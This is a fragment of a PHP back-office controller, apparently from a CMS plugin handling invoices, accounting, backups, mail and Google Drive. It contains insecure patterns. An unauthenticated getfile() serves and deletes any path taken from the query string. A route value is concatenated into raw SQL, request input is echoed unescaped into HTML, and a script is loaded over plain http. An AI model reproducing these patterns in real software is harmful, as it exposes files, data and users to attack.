		}
	
	



		foreach($project as $project){

			$tab = [];
			$tab["pid"] =  $project->id;
			$tab["type"] = "project";
			$tab["title"] = $project->name;
			$tab["start"] = Util::dateLocaleClient($project->start);
			//$tab["end"] =  Util::dateLocaleClient($project->stop);
			$tab["color"] = "#b7843a"; 
			
			$tab["url"] = "service/".$project->id;
			array_push($json, $tab);

		}
								
		echo json_encode($json);
			
    }


    public function selected($type, $val)
    {
        if(!BackendAuth::getUser()->hasAccess('eprog.manager.access_ksef') || !BackendAuth::getUser()->hasAccess('eprog.manager.access_accounting')) return;

        if($type == "nip") Session::put("selected.nip",$val);
        if($type == "year") Session::put("selected.year",$val);
        if($type == "month") Session::put("selected.month",$val);
        if($type == "subject") Session::put("selected.subject",$val);


    }

    public function product()
    {

    	if(!BackendAuth::getUser()->hasAccess('eprog.manager.access_invoice')) return;
 
		include 'plugins/eprog/manager/views/modal/header.php';


		if(Input::has("ord")) $order = Input::get("ord"); else $order = "id"; 
		if(Input::has("type")) $type = Input::get("type"); else $type = "asc"; 
		if($type == "asc") $ntype = "desc"; else $ntype = "asc"; 

		$products = Product::orderBy($order, $ntype);

		if(Input::filled("name")) {
			if(Input::get("typ") == "id")
			$products = $products->where("id","=",Input::get("name"));
			if(Input::get("typ") == "name")
			$products = $products->where("name","like","%".Input::get("name")."%");
			if(Input::get("typ") == "quantity")
			$products = $products->where("quantity","=",Input::get("name"));
			if(Input::get("typ") == "netto")
			$products = $products->where("netto","like","%".Input::get("name")."%");

		}
		else
			$products = $products->where("id",">",0);



		$products = $products->paginate(10);
		$currency = $products->currency ?? Settings::get("currency");

		function sel($input){
			
			if(Input::get("type") == $input) return "selected";
			
		}

		echo "<div style=\"padding:10px\">";
		echo "<div><form action=\"/".config('cms.backendUri')."/eprog/manager/feed/product\"><select name=\"typ\"><option value=\"id\" ".sel("id").">id</option><option value=\"name\" ".sel("name").">".strtolower((trans("eprog.manager::lang.name")))."</option><option value=\"quantity\" ".sel("quantity").">".lcfirst((trans("eprog.manager::lang.quantity")))."</option><option value=\"netto\" ".sel("netto").">".strtolower((trans("eprog.manager::lang.net")))."</option></select> <input type=\"text\" name=\"name\" size=\"20\" value=\"".Input::get("name")."\" /> <button type=\"submit\"  class=\"btn-xm icon-search\"  style=\"position:relative;top:1px;height:23px;margin-top:2px;padding:3px;padding-left:10px;padding-right:10px;border:1px solid #ccc !important\"></form></div>";
		echo "<div style=\"margin-top:5px;float:right;font-size:12px;\">".$products->render()."</div><div style=\"margin-top:10px;margin-bottom:5px;float:right;font-size:12px\">".lcfirst((trans("eprog.manager::lang.total")))." ".$products->total()."</div>";
		echo "<div class=\"tab\">";
		echo "<div style=\"background:var(--mlcolor);\"><div><a href=\"?ord=id&type=".$ntype."\">id</a></div><div style=\"width:65%\"><a href=\"?ord=name&type=".$ntype."\">".strtolower(e(trans("eprog.manager::lang.name")))."</a></div><div><a href=\"?ord=quantity&type=".$ntype."\">".lcfirst(e(trans("eprog.manager::lang.quantity")))."</a></div><div style=\"text-align:right\"><a href=\"?ord=netto&type=".$ntype."\">".strtolower(e(trans("eprog.manager::lang.net_price")))."</a></div><div style=\"text-align:right; width:5%\"><a href=\"?ord=currency&type=".$ntype."\">".strtolower(e(trans("eprog.manager::lang.currency")))."</a></div></div>";

		foreach ($products as $product){
			
			echo "<div><div>".$product->id."</div><div><a href=\"javascript:\" onclick=\"parent.window.addProduct('".Input::get("el")."','".$product->id."','".$product->name."','".$product->netto."','".$product->vat_procent."','".$product->currency."')\">".$product->name."</a></div><div>".$product->quantity."</div><div style=\"text-align:right\">".Util::currency($product->netto)."</div><div style=\"text-align:right\">".$product->currency."</div></div>";

		}
		echo "</div>";	
		echo "</div>";	

		
		include 'plugins/eprog/manager/views/modal/footer.php';	

    }



    public function invoice()
    {

    	if(!BackendAuth::getUser()->hasAccess('eprog.manager.access_invoice')) return;

		$user = User::find(Input::get("user_id"));
		if($user)
	        return '{"name":"'.$user->firm_name.'","nip":"'.$user->firm_nip.'","city":"'.$user->firm_city.'","code":"'.$user->firm_code.'","country":"'.$user->firm_country.'","street":"'.$user->firm_street.'","number":"'.$user->firm_number.'","email":"'.$user->email.'","phone":"'.$user->phone.'"}';


    }

    public function ajaxupdate()
    {


		$table = Input::get("table");
		$option = "<option value=\"0\">-- ".strtolower(trans("eprog.manager::lang.select"))." --</option>";
		$result = null;	

		if(preg_match("/user/i", $table)){
		
			$result = User::orderBy("surname")->get();
	        	foreach($result as $result ){
	            		$option .= "<option value=\"".$result ->id."\">".$result->id." ".$result->surname." ".$result->name." ".$result->firm_name."</option>";
	        	}

		}

		if(preg_match("/category/i", $table)){

			$result = Category::orderBy("ord")->where("disp","=", 1)->get();
	        	foreach($result  as $result){
				$lista[$result->id] = Util::categoryPath($result->id);
	            
	        	}
			asort($lista);
	        	foreach($lista  as $key => $val){
	            		$option .= "<option value=\"".$key."\">".$val."</option>";
	        	}

		}

		if(preg_match("/type/i", $table)){

			$result = Type::orderBy("ord")->orderBy("name")->where("disp","=", 1)->get();
	        	foreach($result  as $result){
	            		$option .= "<option value=\"".$result->id."\">".$result->name."</option>";
	        	}

		}

		if(preg_match("/producent/i", $table)){

			$result = Producent::orderBy("ord")->orderBy("name")->where("disp","=", 1)->get();
	        	foreach($result  as $result){
	            		$option .= "<option value=\"".$result->id."\">".$result->name."</option>";
	        	}

		}



		if($result) return '{"res":"'.addslashes($option).'"}';

    }


	public function backup()
	{

		if(!BackendAuth::getUser()->hasAccess('eprog.manager.access_backup')) return;

		$backup = config('app.backup');


		if(Input::has("page")) $page = Input::get("page"); else $page = 1;


		$quantity = 50; 
		$offset = $quantity*$page -($quantity - 1); 


		$filelist = Util::scan_dir($backup);


		if(is_array($filelist) && sizeof($filelist) > 0) {
			$pages = ceil(sizeof($filelist)/$quantity);

			$count = ($pages - $page)*$quantity + sizeof($filelist)%$quantity;

			$selectedFiles = array_slice($filelist, $offset-1, $quantity);

			echo "<div class=\"backupserwer\">";
			$i = 0;
			foreach($selectedFiles as $file)
			{
	  			$type = "";
				if(preg_match("/zip/i", $file)) $type= e(trans('eprog.manager::lang.backup_file'));
				if(preg_match("/sql/i", $file)) $type= e(trans('eprog.manager::lang.backup_database'));
	    			echo "<div><div>".($count-$i)."</div><div style=\"width:150px\">".$type."</div><div>".$file."</div><div>";
				if(BackendAuth::getUser()->hasAccess("eprog.manager.manage_backup")){
					echo "<button data-request=\"onSave\" data-request-data=\"redirect:0,update:1,restore:1,file:'".$file."'\" data-request-confirm=\"".e(trans('eprog.manager::lang.backup_restore_confirm'))."\"  type=\"button\" name=\"btnd\" value=\"\" class=\"btn-xs btn-secondary oc-icon-reply\">". e(trans('eprog.manager::lang.backup_restore'))."</button>";
					echo "&nbsp;<button data-request=\"onSave\" data-request-data=\"redirect:0,update:1,delete:1,file:'".$file."'\" data-request-confirm=\"".e(trans('eprog.manager::lang.task_confirm'))."\"  type=\"button\" name=\"btnd\" value=\"\" class=\"btn-xs btn-secondary oc-icon-trash\">". e(trans('eprog.manager::lang.del'))."</button>";
				}
				echo "</div></div>"; 
			$i++;	
			}
			echo "</div>";
			echo "<div style=\"margin-left:-3px;margin-top:10px;margin-bottom:100px;\">";

      if($pages > 1){
  			for($i=1;$i<=$pages;$i++){

  				if($page  == $i) { $background="var(--mcolor)"; $color="var(--mlcolor)";} else { $color="var(--mcolor)"; $background="var(--mlcolor)";}
  				echo "<div style=\"float:left;background:".$background.";margin:3px;padding:4px;padding-left:12px;padding-right:12px;border-radius:3px;color:".$color."\">";
  				if($page != $i) echo "<a href=\"?page=".$i."\" style=\"color:".$color."\">";
  				echo $i;
  				if($page != $i) echo "</a>";	
  				echo "</div>";

  			}
      }
			echo "</div>";
			
		 }

	}


   	public function getattach($id, $attach, $folder)
   	{

   		if(!BackendAuth::getUser()->hasAccess('eprog.manager.access_inbox')) return;

   		$client = Client::account('default');
   		$client->connect();
   		$folder = $client->getFolder($folder);
   		$message = $folder->query()->getMessage($id);

   		$attchments = $message->getAttachments();

   		foreach($attchments as $attachment){

   			if($attachment->getId() == $attach){
   				$attachment->save(storage_path('temp/public'));
   				if(file_exists(storage_path('temp/public/'.$attachment->getFilename())))
   				return  response()->download(storage_path('temp/public/'.$attachment->getFilename()),$attachment->getName())->deleteFileAfterSend(true);
   				
   			}
   		}

	}

    public function getIncome($year,$month, $type)
    {

        if(!BackendAuth::getUser()->hasAccess('eprog.manager.access_accounting')) return;

        $nip = Session::get("selected.nip") ?? '';
          

        if($type != "lump"){
            $sum1 = ModelAccounting::where("year", $year)
                        ->where("month","<=", $month)
                        ->where("nip", $nip)
                        ->where("mode", 0)
                        ->where("approve", 1)
                        ->select(DB::raw("
                          SUM(COALESCE(CAST(JSON_UNQUOTE(JSON_EXTRACT(data_document,'$.kpir.kpir9')) AS DECIMAL(15,2)),0)+COALESCE(CAST(JSON_UNQUOTE(JSON_EXTRACT(data_document,'$.kpir.kpir10')) AS DECIMAL(15,2)),0)) as income

                        "))
                        ->pluck('income')
                        ->toArray();
             

            $sum2 = ModelAccounting::where("year", $year)
                        ->where("month","<=", $month)
                        ->where("nip", $nip)
                        ->where("mode", 1)
                        ->where("approve", 1)
                        ->select(DB::raw("
                          SUM(COALESCE(CAST(JSON_UNQUOTE(JSON_EXTRACT(data_document,'$.kpir.kpir12')) AS DECIMAL(15,2)),0)+COALESCE(CAST(JSON_UNQUOTE(JSON_EXTRACT(data_document,'$.kpir.kpir13')) AS DECIMAL(15,2)),0)+COALESCE(CAST(JSON_UNQUOTE(JSON_EXTRACT(data_document,'$.kpir.kpir14')) AS DECIMAL(15,2)),0)+COALESCE(CAST(JSON_UNQUOTE(JSON_EXTRACT(data_document,'$.kpir.kpir15')) AS DECIMAL(15,2)),0)) as costs

                        "))
                        ->pluck('costs')
                        ->toArray();

            $advance = Advance::where("year", $year)
                        ->where("month", $month > 1 ? $month - 1 : 1)
                        ->where("nip", $nip)
                        ->selectRaw("JSON_UNQUOTE(JSON_EXTRACT(data, '$.advance.".$type.".sum')) as sum")
                        ->pluck('sum')
                        ->toArray();

            $zus1 = Zus::where("year", $year)
                        ->where("month","<=",$month)
                        ->where("nip", $nip)
                        ->sum('social');

            $zus2 = Zus::where("year", $year)
                        ->where("month","<=",$month)
                        ->where("nip", $nip)
                        ->sum('health');
            $income =  $sum1[0] ?? ''; 
            $costs  =  $sum2[0] ?? ''; 
            $sum    =  $month > 1 ? ($advance[0] ?? '') : ''; 
            $social =  $zus1  ?? '';
            $health =  $zus2 ?? '';
        }
        else{

            $sum1 = ModelAccounting::where("year", $year)
                        ->where("month", $month)
                        ->where("nip", $nip)
                        ->where("mode", 0)
                        ->where("approve", 1)
                        ->select(DB::raw("
                            SUM(CAST(JSON_UNQUOTE(JSON_EXTRACT(data_document,'$.kpir.ewpz9')) AS DECIMAL(15,2))) as income
                        "))
                        ->pluck('income')
                        ->toArray();
            $advance = Advance::where("year", $year)
                        ->where("month", $month > 1 ? $month - 1 : 1)
                        ->where("nip", $nip)
                        ->selectRaw("JSON_UNQUOTE(JSON_EXTRACT(data, '$.advance.".$type.".sum')) as sum")
                        ->pluck('sum')
                        ->toArray();

            $zus1 = Zus::where("year", $year)
                        ->where("month",$month)
                        ->where("nip", $nip)
                        ->sum('social');

            $zus2 = Zus::where("year", $year)
                        ->where("month",$month)
                        ->where("nip", $nip)
                        ->sum('health');

            $income =  $sum1[0] ?? '';  
            $sum    =  $month > 1 ? ($advance[0] ?? '') : ''; 
            $lump = User::where("firm_nip",$nip)->first()->tax_lump ?? '';
            if($nip == SettingConfig::get("nip")) $lump = SettingConfig::get("tax_lump");
            $social =  $zus1  ?? '';
            $health =  $zus2 ?? '';


        }

        $line_rate  = config("tax.advance.line.".$year.".rate");
        $line_limit = config("tax.advance.line.".$year.".limit");
        $scale_treshold  = config("tax.advance.scale.".$year.".scale_treshold");
        $scale_treshold_down = config("tax.advance.scale.".$year.".scale_treshold_down");
        $scale_treshold_up = config("tax.advance.scale.".$year.".scale_treshold_up");
        $scale_reduce = config("tax.advance.scale.".$year.".scale_reduce");

        return json_encode(["income" => $income ?? '',"costs" => $costs ?? '',"sum" => $sum ?? '', "lump" => $lump ?? '', 'social' => $social, 'health' => $health, 'line_rate' => $line_rate, 'line_limit' => $line_limit, 'scale_treshold' => $scale_treshold, 'scale_treshold_down' => $scale_treshold_down, 'scale_treshold_up' => $scale_treshold_up, 'scale_reduce' => $scale_reduce]);            
    
        
    }

    public function taxfile($year,$month)
    {

        if(!BackendAuth::getUser()->hasAccess('eprog.manager.access_accounting')) return;

        $nip = Session::get("selected.nip") ?? '';

        $taxfile = ModelTaxfile::where("year", $year)
                        ->where("month",$month)
                        ->where("nip", $nip)
                        ->first();
                        
        return json_encode(["id" => $taxfile->id ?? 0 ]);                


    }

	public function getInvoiceXml($invoice)
	{

        if(!(BackendAuth::getUser()->hasAccess('eprog.manager.access_invoice') || BackendAuth::getUser()->hasAccess('eprog.manager.access_free'))) return;
              
        $file = storage_path('temp/public/xml_'.$invoice);
        if(file_exists($file))
        return  response()->download($file,$invoice.".xml")->deleteFileAfterSend(true);

	    return true;
	    
	}

	public function getInvoicePdf($invoice)
	{

		if(!(BackendAuth::getUser()->hasAccess('eprog.manager.access_invoice') || BackendAuth::getUser()->hasAccess('eprog.manager.access_free'))) return;
              
        $file = storage_path('temp/public/pdf_'.$invoice);
        if(file_exists($file))
        return  response()->download($file,$invoice.".pdf")->deleteFileAfterSend(true);

	    return true;

	}

	public function getKsefPdf($invoice)
	{

		if(!BackendAuth::getUser()->hasAccess('eprog.manager.access_ksef')) return;
              
        $file = storage_path('temp/public/pdf_'.$invoice);
        if(file_exists($file))
        return  response()->download($file,$invoice.".pdf")->deleteFileAfterSend(true);

	    return true;

	}

	public function getInvoiceUpo($invoice)
	{

        if(!(BackendAuth::getUser()->hasAccess('eprog.manager.access_invoice') || BackendAuth::getUser()->hasAccess('eprog.manager.access_free'))) return;
              
        $file = storage_path('temp/public/upo_'.$invoice);
        if(file_exists($file))
        return  response()->download($file,"upo_".$invoice.".pdf")->deleteFileAfterSend(true);

	    return true;
	    
	}

        public function getJpkUpo($jpk)
        {

            if(!BackendAuth::getUser()->hasAccess('eprog.manager.access_accounting')) return;
                  
            $file = storage_path('temp/public/jpkupo_'.$jpk);
            if(file_exists($file))
            return  response()->download($file,"upo_".$jpk.".pdf")->deleteFileAfterSend(true);

            return true;
            
        }


	public function getOrderPdf($order)
	{

		if(!BackendAuth::getUser()->hasAccess('eprog.manager.access_order')) return;
              
        $file = storage_path('temp/public/'.$order);
        if(file_exists($file))
        return  response()->download($file,$order.".pdf")->deleteFileAfterSend(true);

	    return true;

	}

	public function downloadInvoicePdf($id)
	{

		if(!BackendAuth::getUser()->hasAccess('eprog.manager.access_invoice')) return;

	    $invoice = ModelInvoice::find($id);  
	    if($invoice && $invoice->ksefNumber){	

			$file = storage_path('temp/public/'.str_replace("/","_",$invoice->nr).'_'.str_replace(".","",$invoice->seller_name).'.pdf');
            $pdf = KSef::generateInvoicePdf($invoice); 
			file_put_contents($file, $pdf);  
			if(file_exists($file)) return Redirect::to('/'.config('cms.backendUri').'/eprog/manager/feed/getfile?file='.urlencode($file));		
	    }
	    else
	    	Flash::error(e(trans('eprog.manager::lang.ksef.download_error')));
	}

	public function downloadKsefPdf($id)
	{

		if(!BackendAuth::getUser()->hasAccess('eprog.manager.access_ksef')) return;

		$invoice = ModelKsef::find($id);  
		if($invoice && $invoice->ksefNumber){   
            $file = storage_path('temp/public/'.str_replace("/","_",$invoice->invoiceNumber).'_'.str_replace(".","",$invoice->sellerName).'.pdf');
            $pdf = KSef::generateInvoicePdf($invoice); 
		        file_put_contents($file, $pdf);  
            if(file_exists($file)) return Redirect::to('/'.config('cms.backendUri').'/eprog/manager/feed/getfile?file='.urlencode($file));   
		}
		else
		    Flash::error(e(trans('eprog.manager::lang.ksef.download_error')));

	}

    public function getfile()
    {              
        $file = urldecode($_GET['file'] ?? '');
        $filename = explode("/",$file);
        $filename = $filename[sizeof($filename)-1] ?? "";
        if(file_exists($file) && $filename != "")
        return  response()->download($file, $filename)->deleteFileAfterSend(true);
    }


	public function getCertyficate()
	{
        
        if(!BackendAuth::getUser()->hasAccess('eprog.manager.access_ksef')) return;
             
        $file = storage_path('temp/public/certificate.p12');
        if(file_exists($file))
        return  response()->download($file,"certificate.p12")->deleteFileAfterSend(true);

	    return true;

	}


   	public function inbox()
   	{

   		if(!BackendAuth::getUser()->hasAccess('eprog.manager.access_inbox')) return;

   		$client = Client::account('default');
   		$client->connect();
   		$folder = $client->getFolder(onfig("imap.folders.inbox.folder"));

   		echo $folder->query()->unseen()->get()->count();

	}

   	public function body($id, $folder)
   	{

   		if(!BackendAuth::getUser()->hasAccess('eprog.manager.access_inbox')) return;

   		$client = Client::account('default');
   		$client->connect();
   		$folder = $client->getFolder($folder);

   		$message = $folder->query()->getMessage($id);
   		$body =  iconv('utf-8', 'utf-8//IGNORE', $message->hasHtmlBody() ? $message->getHtmlBody() : $message->getTextBody());

   		echo $body;

	}

   	public function ksef($id)
   	{

   		if(!BackendAuth::getUser()->hasAccess('eprog.manager.access_ksef')) return;

   		$invoice = ModelKsef::find($this->params[0]);

   		$xml = $invoice->xml;

   		$fa = Util::getBetween($xml,'kodSystemowy="','"') ?? "FA (3)";
   		$fa = $fa == "FA (3)" ? "3" : "2";

   		$nr = $invoice->ksefNumber;

   		$xml_doc = new \DOMDocument();
   		$xml_doc->loadXml($xml);

   		$xsl_doc = new \DOMDocument();
   		$xsl_doc->load("docs/invoice".$fa .".xsl");

   		$proc = new \XSLTProcessor();

   		$proc->importStylesheet($xsl_doc);

   		$newdom = $proc->transformToXml($xml_doc);

   		$html = str_replace("{{NrKsef}}",$nr,$newdom);    

   		$qrcode = Ksef::getQRCode($xml, $nr);

   		if($qrcode){
   			$img = "<img src=\"data:image/png;base64,".base64_encode($qrcode->code1->raw)."\" style=\"margin-top:5px;width:200px\"/><br><a href=\"".$qrcode->code1->url."\" target=\"_blank\"/>".$qrcode->code1->url."</a>";
            $html = str_replace("{{QRCode}}",$img,$html);
   		}
   		else
   			$html = str_replace("{{QRCode}}","",$html);

        $html = str_replace("{height}","250",$html);

   		echo $html;

	}

   	public function prompt()
   	{

   		if(!BackendAuth::getUser()->hasAccess('eprog.manager.access_scheduler')) return;

   		include "plugins/eprog/manager/views/modal/header.php";

   		$stop = Input::get("stop");

   		if(Input::get("start") == Input::get("stop"))
   		$stop =  date("Y-m-d H:i", strtotime('+1 hours', strtotime(Input::get("start"))));

   		echo "<center>";
   		echo e(trans("eprog.manager::lang.from"))." <input type=\"text\"  name=\"start\" value=\"".Input::get("start")."\" style=\"width:140px;margin-bottom:10px;border:1px solid #ddd;padding:5px;margin-top:30px;;margin-bottom:20px;margin-right:20px\">";
   		echo e(trans("eprog.manager::lang.to"))." <input type=\"text\"  name=\"stop\" value=\"".$stop."\" style=\"width:140px;margin-bottom:10px;border:1px solid #ddd;padding:5px;margin-top:30px;margin-bottom:20px\"><br>";
   		echo "<a href=\"javascript:\" onclick=\"parent.window.location.href='/".config('cms.backendUri')."/eprog/manager/scheduler/create?start=' + document.getElementsByName('start')[0].value + '&stop=' + document.getElementsByName('stop')[0].value\" class=\"btn btn-primary oc-icon-calendar\" style=\"background:#68a42e\">".e(trans("eprog.manager::lang.event"))."</a>&nbsp;&nbsp;";
   		if(Util::mode("5")){
         echo "<a href=\"javascript:\" onclick=\"parent.window.location.href='/".config('cms.backendUri')."/eprog/manager/project/create?start=' + document.getElementsByName('start')[0].value + '&stop=' + document.getElementsByName('stop')[0].value\" class=\"btn btn-primary oc-icon-gear\" style=\"background:#b7843a\">".e(trans("eprog.manager::lang.project_one"))."</a>&nbsp;&nbsp;";
   		   echo "<a href=\"javascript:\" onclick=\"parent.window.location.href='/".config('cms.backendUri')."/eprog/manager/work/create?start=' + document.getElementsByName('start')[0].value + '&stop=' + document.getElementsByName('stop')[0].value\" class=\"btn btn-primary oc-icon-gears\" style=\"background:#8a62c4\">".e(trans("eprog.manager::lang.work_one"))."</a>";
      }

	}

   	public function mailing_history($id, $key)
   	{

		if(!BackendAuth::getUser()->hasAccess('eprog.manager.access_mailing')) return;

		$mailing = Mailing::find($id);
		$history = json_decode($mailing->send, true);
		echo "<div style='font-family:Arial, Tahoma;font-size:13px'>";
		foreach($history[$key]["emails"] as $email)
		echo $email."<br>";	
		echo "</div>";		

	}

	public function reset()
	{
		//session_start();
		//unset($_SESSION['upload_token']); 
		//unset($_SESSION['authUrl']); 
		//return response()->download("storage/temp/public/ChoiMoonJung_30_Retouching.jpg");

	}

	public function drive()
	{

/*
		$client = Google::connect();
		if($client->getAccessToken()){
		  $service = new \Google_Service_Drive($client);
		  
		  $type = "application/vnd.google-apps.document";
		  $uplodFile = new \Google\Service\Drive\DriveFile();
		  $uplodFile->setName("mojokddd6");
		  //$uplodFile->setParents(array('1EYkBd4j3WxVf6OzApUG4msqfYwmyCXPZ'));
		  $uplodFile->setParents(array('1EYkBd4j3WxVf6OzApUG4msqfYwmyCXPZ'));
		  $uplodFile->setMimeType($type);
		  $result = $service->files->create(
		      $uplodFile,
		      [
		      
		          'mimeType'   => $type,
		          'uploadType' => 'multipart'
		      ]
		  );

		  dd($result);
	
		}

		die();


		$client = Google::connect();


		if($client->getAccessToken()){

		    $service = new \Google_Service_Drive($client);

		    $files = $service->files->listFiles([
		        'q' => "name = 'Hello World!'",
		        'fields' => 'files(name,id,size)'
		    ]);

		    $fileId = '1H1cjTx_JXxJIE-lEiYUn1H3V-dCYYDx2';
		    //$fileId = '1AsQvcY3f4itjaB6caSEtQn3Dd9UEASsMrrgnfL_CQi4';

		    dd($service->permissions->listPermissions($fileId));

		    $file = $service->files->get($fileId,['fields' => 'contentHints/thumbnail,fileExtension,iconLink,id,name,size,thumbnailLink,webContentLink,webViewLink,mimeType,parents, createdTime, modifiedTime']);
		    dd($file);
		    file_put_contents($file->name,$file->getBody());
		    $downloadUrl = $file->getDownloadUrl;
	
		  
		      $downloadUrl = $file->getDownloadUrl();


		    $fileId = $files[0]->id;
		    $fileSize = intval($files[0]->size);

		    $http = $client->authorize();

		    $tmp_file = "storage/temp/public/".$files[0]->name;
		    $fp = fopen($tmp_file, 'w');

		    $chunkSizeBytes = 1 * 1024 * 1024;
		    $chunkStart = 0;


		    while ($chunkStart < $fileSize) {
		        $chunkEnd = $chunkStart + $chunkSizeBytes;
		        $response = $http->request(
		            'GET',
		            sprintf('/drive/v3/files/%s', $fileId),
		            [
		            'query' => ['alt' => 'media'],
		            'headers' => [
		            'Range' => sprintf('bytes=%s-%s', $chunkStart, $chunkEnd)
		            ]
		            ]
		        );
		        $chunkStart = $chunkEnd + 1;
		        fwrite($fp, $response->getBody()->getContents());
		    }

		    fclose($fp);

	
		    return response()->download($tmp_file)->deleteFileAfterSend(true);

		   
		}

		*/

	}



	public function drive_import()
	{

		if(!BackendAuth::getUser()->hasAccess('eprog.manager.manage_drive')) return;

			if(Input::has("id") && Input::has("folder")){

				$client = Google::connect();
				if($client->getAccessToken()){

				    $service = new \Google_Service_Drive($client);
				    $file = $service->files->get(Input::get("id"),['fields' => 'name,id,size,webContentLink','supportsAllDrives' => true,'supportsTeamDrives' => true]);

				    if($file){
				    	
						    $http = $client->authorize();

						    $tmp_file = "storage/temp/public/".$file->name;
						    $fp = fopen($tmp_file, 'w');

						    $chunkSizeBytes = 1 * 1024 * 1024;
						    $chunkStart = 0;

						    while ($chunkStart < $file->size) {
						        $chunkEnd = $chunkStart + $chunkSizeBytes;
						        $response = $http->request(
						            'GET',
						            sprintf('/drive/v3/files/%s', $file->id),
						            [
						            'query' => ['alt' => 'media'],
						            'headers' => [
						            'Range' => sprintf('bytes=%s-%s', $chunkStart, $chunkEnd)
						            ]
						            ]
						        );
						        $chunkStart = $chunkEnd + 1;
						        fwrite($fp, $response->getBody()->getContents());
						    }

						    fclose($fp);

						    if(file_exists($tmp_file)){
							    $modelFile = ModelFile::find(1);
					
				    			$imageModel = new File();
				    			$imageModel->is_public = 0;
				    			$imageModel->attachment_id  = 1;
				    			$imageModel->attachment_type = "Eprog\Manager\Models\File";
				    			$imageModel->fromFile($tmp_file);

				    			if(Input::get("folder") == 1){
				    				$imageModel->field = "document";
				    				$imageModel->save();
				    				$modelFile->document->add($imageModel);
				    			}
					    		else if(Input::get("folder") == 2){
					    			$imageModel->field = "image";
					    			$imageModel->save();
					    			$modelFile->image->add($imageModel);
					    		}
						    	else if(Input::get("folder") == 3){
						    		$imageModel->field = "media";
						    		$imageModel->save();
						    		$modelFile->media->add($imageModel);
						    	}
					
						    	unlink($tmp_file);

						    	echo "<script>parent.window.modal.dialog('close');parent.window.location.href='/".config('cms.backendUri')."/eprog/manager/file/update/1'</script>";	
						
						}

	    			}

				  
				}


			} 

			else {

				session_start();
				if(isset($_SESSION['upload_token'])) {
				
					include 'plugins/eprog/manager/views/modal/header.php';

					$id = Input::get("id");

					echo "<div style=\"font-family:'Segoe UI',Helvetica,Arial;font-size:14px;\"><center><br>";
					echo e(trans("eprog.manager::lang.drive_import_to"));
					echo "<br><br><input type=\"radio\" name=\"folder\" value=\"1\" checked> ".e(trans("eprog.manager::lang.document"));
					echo "&nbsp;&nbsp;&nbsp;<input type=\"radio\" name=\"folder\" value=\"2\"> ".e(trans("eprog.manager::lang.image"));
					echo "&nbsp;&nbsp;&nbsp;<input type=\"radio\" name=\"folder\" value=\"3\"> ".e(trans("eprog.manager::lang.media"));
					echo "<input type=\"hidden\" name=\"_token\" value=\"".csrf_token()."\">";
					echo "<input type=\"hidden\" name=\"action\" value=\"done\">";
					echo "<div id=\"load\" class=\"loadmodal loading-indicator-container\"  style=\"display:none;margin-left:20px\"><div class=\"loading-indicator  size-small indicator-center\" style=\"background-color: #fff;\"><span style=\"margin-top:30px\"></span></div></div>";
					echo "<br><button class=\"btn btn-primary oc-icon-level-down\"  style=\"margin-top:40px\" onclick=\"$(this).hide();$('#load').show();window.location.href='/".config('cms.backendUri')."/eprog/manager/feed/drive_import?id=".$id."&folder=' + $('input:radio[name=folder]:checked').val()\">".e(trans("eprog.manager::lang.drive_import"))."</button>";
					echo "</div>";

				}
				else 
					echo "<div style=\"font-family:'Segoe UI',Helvetica,Arial;font-size:14px;\"><center>".e(trans("eprog.manager::lang.token_expired"))."</center></div>";

		
			}

	}

	public function drive_create()
	{

		if(!BackendAuth::getUser()->hasAccess('eprog.manager.manage_drive')) return;

		if(Input::filled("type") && Input::filled("filename")){

			$client = Google::connect();
			if($client->getAccessToken()){

			    $service = new \Google_Service_Drive($client);

			    if(Input::get("type") == 1)
			    	$type = "application/vnd.google-apps.folder";
			    else
			    	$type = "application/vnd.google-apps.".Input::get("mime");

			    $uplodFile = new \Google\Service\Drive\DriveFile();
			    $uplodFile->setName(trim(Input::get("filename")));
			    if(Input::filled('folder'))
			    $uplodFile->setParents(array(Input::get('folder')));
			    $uplodFile->setMimeType($type);
			    $result = $service->files->create(
			        $uplodFile,
			        [
			            'mimeType'   => $type,
			        ]
			    );

			    Flash::success(Lang::get('eprog.manager::lang.process_success'));
				echo "<script>parent.window.modal.dialog('close');parent.window.location.href='/".config('cms.backendUri')."/eprog/manager/drive?folder=".Input::get("folder")."&name=".Input::get("name")."'</script>";	

			}


		}
		else{	

			include 'plugins/eprog/manager/views/modal/header.php';
			echo  "<script  src=\"http://emode.pl/modules/backend/assets/js/vendor/jquery.min.js?v=1.2.3\" importance=\"high\"></script>";

			echo "<div style=\"font-family:'Segoe UI',Helvetica,Arial;font-size:14px;\"><center><br>";
			echo "<div style=\"width:300px;text-align:left\">";
			//echo e(trans("eprog.manager::lang.drive_create"));
			echo "<input type=\"radio\" name=\"type\" value=\"1\" checked> ".e(trans("eprog.manager::lang.folder"));
			echo "<br><input type=\"radio\" name=\"type\" value=\"2\" style=\"margin-top:15px\"> ".e(trans("eprog.manager::lang.file"));
			echo "&nbsp;&nbsp;&nbsp;&nbsp;<select name=\"mime\" id=\"mime\" class=\"form-control\" style=\"margin-top:10px\">";
			echo "<option value=\"document\">".e(trans("eprog.manager::lang.google_document"))."</option>";
			echo "<option value=\"spreadsheet\">".e(trans("eprog.manager::lang.google_spreadsheet"))."</option>";
			echo "<option value=\"presentation\">".e(trans("eprog.manager::lang.google_presentation"))."</option>";
			echo "<option value=\"drawing\">".e(trans("eprog.manager::lang.google_drawing"))."</option>";
			echo "</select>";

			echo "<input type=\"hidden\" id=\"folder\" name=\"folder\" value=\"".Input::get("folder")."\">";
			echo "<input type=\"hidden\" id=\"name\" name=\"name\" value=\"".Input::get("name")."\">";
			echo "<div><center>";
			echo "<input id=\"filename\" type=\"filename\" name=\"filename\" value=\"\" size=\"40\" placeholder=\"".e(trans("eprog.manager::lang.name"))."\" class=\"form-control\"  style=\"margin-top:10px\">";
			echo "<div style=\"margin-top:10px;color:red;height:25px\"><div id=\"error\" style=\"display:none\">".e(trans("eprog.manager::lang.drive_enter_name"))."</div></div>";
			echo "<div id=\"load\" class=\"loadmodal loading-indicator-container\"  style=\"display:none;margin-left:20px\"><div class=\"loading-indicator  size-small indicator-center\" style=\"background-color: #fff;\"><span style=\"margin-top:0px\"></span></div></div>";
			echo "<button class=\"btn btn-primary oc-icon-plus-circle\"  style=\"margin-top:10px\" onclick=\"if($('#filename').val().trim() == ''){ $('#error').show(); return}$('#error').hide();$(this).hide();$('#load').show();window.location.href='/".config('cms.backendUri')."/eprog/manager/feed/drive_create?type=' + $('input:radio[name=type]:checked').val() + '&mime=' + $('#mime').val() + '&filename=' + $('#filename').val() + '&folder=' + $('#folder').val() + '&name=' + $('#name').val() \">".e(trans("eprog.manager::lang.create"))."</button>";
			echo "</div></div>";
